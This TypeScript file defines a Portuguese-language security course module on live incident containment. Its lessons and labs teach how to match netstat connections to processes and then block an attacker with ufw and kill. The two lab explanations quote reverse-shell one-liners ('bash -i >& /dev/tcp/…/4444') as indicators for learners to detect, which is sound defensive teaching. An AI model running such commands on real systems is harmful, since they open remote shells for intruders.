import type { Challenge, LabChallenge, TheoryChallenge } from '@/types/challenge';

/**
 * Módulo "Firewall ao vivo: bloqueando em tempo real" (episódio 55) — último dos 4
 * módulos pedidos pelo usuário. Comandos novos: netstat e ufw. Contenção completa =
 * bloquear a rede (ufw) E encerrar o processo (kill, já ensinado no episódio 48).
 */

const t0: TheoryChallenge = {
  id: 'firewall.0',
  type: 'theory',
  episode: 55,
  room: '55.0',
  title: 'Conter em tempo real: rede e processo, os dois lados',
  description: 'Encerrar só o processo não impede uma nova conexão. Bloquear só a rede não para o processo já rodando.',
  content: `
**Duas frentes de contenção**
Você já aprendeu, no módulo de Ataque e Defesa (episódio 48), a encerrar um processo malicioso com \`kill\`. Isso resolve metade do problema: o processo para de rodar **agora**. Mas se o atacante ainda tiver acesso de rede à máquina, nada impede que ele abra uma conexão nova e comece de novo.

A outra metade é a **rede**: bloquear o IP de origem no firewall, para que nenhuma conexão nova dele seja aceita, não importa o que ele tente.

**A doutrina de contenção completa**
1. Identificar a ameaça (cruzando processos e conexões de rede)
2. Bloquear a rede — impede reconexão
3. Encerrar o processo — para a ameaça que já está rodando

Fazer só um dos dois deixa a porta entreaberta. Neste módulo, você pratica os dois.
  `,
};

const t1: TheoryChallenge = {
  id: 'firewall.1',
  type: 'theory',
  episode: 55,
  room: '55.1',
  title: 'netstat: quem está conectado agora',
  description: 'Cruzar conexões de rede com processos é como uma investigação de log, só que em tempo real.',
  content: `
**O que o netstat mostra**
\`netstat\` lista as conexões de rede ativas de uma máquina: de onde vêm, para qual porta local, e (com o PID) **qual processo é o dono** daquela conexão:
\`\`\`
netstat
Proto Local Address        Foreign Address        State        PID/Program
tcp   0.0.0.0:443           198.51.100.20:51322    ESTABLISHED  1204/nginx:
tcp   0.0.0.0:4444          203.0.113.44:47711     ESTABLISHED  4931/bash
\`\`\`

**Por que cruzar com ps**
Uma porta de saída incomum (como a 4444, o mesmo indicador clássico de shell reversa que você viu no módulo de Ataque e Defesa) já é um alerta. Mas é o **processo dono** daquela conexão — visto com \`ps\` — que confirma se é, de fato, uma shell reversa ou algo legítimo. Nenhum dos dois comandos sozinho conta a história completa; a correlação entre os dois é a técnica.
  `,
};

const t2: TheoryChallenge = {
  id: 'firewall.2',
  type: 'theory',
  episode: 55,
  room: '55.2',
  title: 'ufw: bloqueando um IP no firewall',
  description: 'O comando real do firewall mais usado em distribuições Linux voltadas a servidor.',
  content: `
**O que é o ufw**
"Uncomplicated Firewall" é o gerenciador de firewall padrão do Ubuntu e de várias distribuições Linux — uma interface simples sobre o firewall real do kernel. É o mesmo comando que um administrador de sistemas usaria de verdade num servidor de produção.

**Bloqueando um IP**
\`\`\`
ufw deny from 203.0.113.44
Rule added
\`\`\`
A partir daí, nenhuma conexão nova vinda desse IP é aceita — inclusive uma nova tentativa de SSH, por exemplo.

**Conferindo o que está bloqueado**
\`ufw status\` mostra as regras ativas no momento, útil para confirmar que o bloqueio realmente entrou em vigor.

**O que o bloqueio NÃO faz sozinho**
Bloquear o IP não encerra uma conexão ou um processo que já estava rodando antes do bloqueio — por isso a contenção completa (sala anterior) sempre combina \`ufw deny\` com \`kill\`.
  `,
};

const lab1: LabChallenge = {
  id: 'firewall.3',
  type: 'lab',
  episode: 55,
  room: '55.3',
  labId: 'term-firewall-contain',
  title: 'Lab 1 — Contenção guiada',
  description: 'O monitoramento notou tráfego de saída incomum na porta 4444. Investigue e contenha.',
  instructions: 'Cruze ps com netstat, bloqueie o IP malicioso no firewall e encerre o processo.',
  difficulty: 'easy',
  hints: [
    'cat missao.txt para o contexto',
    'ps mostra os processos; netstat mostra as conexões e o PID dono',
    'A porta 4444 e o comando bash -i são o padrão clássico de shell reversa',
    'ufw deny from <ip> bloqueia; kill <pid> encerra — faça os dois',
  ],
  explanation: `
**O que você conteve**
O processo 4931 ("bash -i >& /dev/tcp/203.0.113.44/4444 0>&1") é uma shell reversa clássica, confirmada pela conexão de saída na porta 4444 no netstat. Bloquear o IP no firewall impede uma nova conexão; encerrar o processo mata a que já estava aberta.

**Por que isso importa:** essa é a sequência real que um analista de resposta a incidentes segue ao confirmar um comprometimento ativo — rede primeiro (contém a propagação), depois processo (para a ameaça corrente).
  `,
};

const t3: TheoryChallenge = {
  id: 'firewall.4',
  type: 'theory',
  episode: 55,
  room: '55.4',
  title: 'Nem toda conexão incomum é um ataque',
  description: 'A mesma lição do módulo de Ataque e Defesa, agora com rede: evidência, não vibe.',
  content: `
**Falsos alarmes existem — e são comuns**
Backups automáticos, sincronizações, monitoramento de terceiros: todos geram conexões de saída que podem parecer estranhas à primeira vista, especialmente para quem não conhece a rotina normal daquele servidor. Encerrar o processo errado, achando que era a ameaça, pode derrubar algo legítimo (como um backup) sem conter nada de verdade.

**O que realmente diferencia ameaça de rotina**
Não é "isso parece estranho" — é a combinação de indícios: porta de saída fora do padrão (como 4444), o comando do processo em si (uma shell interativa conectando para fora é muito diferente de uma ferramenta de backup conhecida), e o contexto da missão.

**No próximo laboratório**
Você vai ver três conexões simultâneas, sob pressão de tempo — só uma é a ameaça real.
  `,
};

const lab2: LabChallenge = {
  id: 'firewall.5',
  type: 'lab',
  episode: 55,
  room: '55.5',
  labId: 'term-firewall-live',
  title: 'Lab 2 — Contenção sob pressão',
  description: 'CRONOMETRADO. Múltiplas conexões ativas no servidor. Só uma é a ameaça real. Contenha-a.',
  instructions: 'Cruze ps com netstat, identifique a ameaça real (não o backup) e contenha-a: bloqueie e encerre.',
  difficulty: 'hard',
  hints: [
    'ps e netstat primeiro, sempre — nunca aja sem confirmar',
    'O processo do backup roda como root e usa rsync; a ameaça roda como www-data e abre uma shell',
    'A porta 4444 continua sendo o indicador mais forte de shell reversa',
    'ufw deny from <ip do atacante>, depois kill <pid do atacante>',
  ],
  explanation: `
**A ameaça real era o processo 2290**
"bash -i >& /dev/tcp/198.51.100.77/4444 0>&1", rodando como www-data (o usuário do servidor web — nunca deveria estar abrindo uma shell interativa para fora). O processo 812 (rsync como root, para a porta 22 de um IP de backup) era rotina: barulhento, mas legítimo.

**A lição principal**
Sob pressão, é tentador agir rápido demais e encerrar o primeiro processo "estranho". A investigação (ps + netstat, cruzando usuário, comando e porta) é o que separa uma contenção certeira de um incidente adicional causado pela própria resposta.
  `,
};

const tEnd: TheoryChallenge = {
  id: 'firewall.6',
  type: 'theory',
  episode: 55,
  room: '55.6',
  title: 'Parabéns! Você concluiu os módulos de terminal profissional',
  description: 'netstat + ufw + kill fecham o ciclo de contenção que você vem construindo desde o episódio 48.',
  content: `
**O que você aprendeu**
• Por que conter uma ameaça tem duas frentes: rede (ufw) e processo (kill)
• Cruzar conexões de rede (netstat) com processos (ps) para confirmar uma ameaça
• Diferenciar tráfego incomum de tráfego malicioso, com evidência, não suposição
• A doutrina completa de contenção sob pressão de tempo

**Ferramentas reais equivalentes**
No trabalho, você usaria \`ss\` ou \`netstat\` de verdade, \`iptables\`/\`ufw\`/\`firewalld\` conforme a distribuição, e em ambientes corporativos maiores, um EDR faria boa parte dessa correlação automaticamente — mas o raciocínio por trás continua sendo exatamente esse.

**Você concluiu os módulos de terminal e segurança mais avançados do curso**
Active Directory, Ferramentas de Pentest, Log e SIEM, Análise de Malware, Cloud e, agora, Firewall ao vivo — um conjunto de habilidades que, juntas, cobrem boa parte do trabalho real de um analista de segurança júnior.
  `,
};

export const firewallLiveChallenges: Challenge[] = [t0, t1, t2, lab1, t3, lab2, tEnd];
